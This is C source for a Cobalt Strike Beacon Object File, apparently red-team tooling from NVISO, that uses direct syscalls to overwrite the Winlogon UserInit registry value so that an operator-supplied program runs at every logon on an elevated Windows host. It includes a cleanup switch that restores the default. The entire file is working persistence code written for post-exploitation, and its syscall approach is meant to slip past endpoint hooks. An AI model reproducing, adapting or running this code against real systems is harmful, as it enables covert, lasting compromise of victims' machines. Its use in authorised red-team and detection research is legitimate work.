////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//      PERSISTELEVATEDUSERINITREGKEY BOF                                                                             //
//                                                                                                                    //
//      POWERED BY: CobaltWhispers, SysWhispers2, InlineWhispers2                                                     //
//      AUTHOR: @Cerbersec                                                                                            //
//      PROPERTY OF: @NVISOsecurity                                                                                   //
//                                                                                                                    //
//      COMPILE WITH: gcc -o PersistElevatedUserInitRegKey.o -c PersistElevatedUserInitRegKey.c -masm=intel           //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <windows.h>
#include "beacon.h"
#include "syscalls.c"

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                                      IMPORTS                                                       //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

DECLSPEC_IMPORT size_t MSVCRT$wcslen(const wchar_t*);
DECLSPEC_IMPORT wchar_t* MSVCRT$wcscat(wchar_t*, const wchar_t*);
DECLSPEC_IMPORT NTSYSAPI NTSTATUS NTAPI NTDLL$RtlOpenCurrentUser(ACCESS_MASK, PHANDLE);

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//                                                         MAIN                                                       //
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

void go(char* args, int alen) {

    /*==================================*/
    /*              PAYLOAD             */
    /*==================================*/

    datap parser;
    BeaconDataParse(&parser, args, alen);

    char* buff1 = BeaconDataExtract(&parser, NULL);

    wchar_t* name = L"\\REGISTRY\\MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon";
    wchar_t* regKeyName = L"UserInit";
    wchar_t vData[300];

    toWideChar(buff1, vData, 300);
    int cleanup = BeaconDataInt(&parser);

    /*==================================*/
    /*          SETTING UP KEYS         */
    /*==================================*/

    NTSTATUS status;

    HANDLE key, root;
    OBJECT_ATTRIBUTES oa;
    UNICODE_STRING keyName;

    keyName.Buffer = name;
    keyName.Length = MSVCRT$wcslen(name) * 2;
    keyName.MaximumLength = 0;
    InitializeObjectAttributes(&oa, &keyName, OBJ_CASE_INSENSITIVE, NULL ,NULL);

    status = NtOpenKeyEx(&key, KEY_WRITE, &oa, 0);
    if(status != STATUS_SUCCESS){
        BeaconPrintf(CALLBACK_ERROR, "Could not open key: %x", status);
        NtClose(key);
        NtClose(root);
        return;
    }

    //TODO: change memory allocation
    wchar_t buffer[200] = L"C:\\windows\\system32\\userinit.exe,";

    if(!cleanup)
    {
        MSVCRT$wcscat(buffer, vData);
    }

    UNICODE_STRING valueName;
    valueName.Buffer = regKeyName;
    valueName.Length = MSVCRT$wcslen(regKeyName) * 2;
    valueName.MaximumLength = 0;

    status = NtSetValueKey(key, &valueName, 0, REG_SZ, (PVOID)buffer, MSVCRT$wcslen(buffer) * 2);
    if(status != STATUS_SUCCESS){
        BeaconPrintf(CALLBACK_ERROR, "Could not set key value: %x", status);
        NtClose(key);
        NtClose(root);
        return;
    }

    NtClose(key);
    NtClose(root);

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Done");
}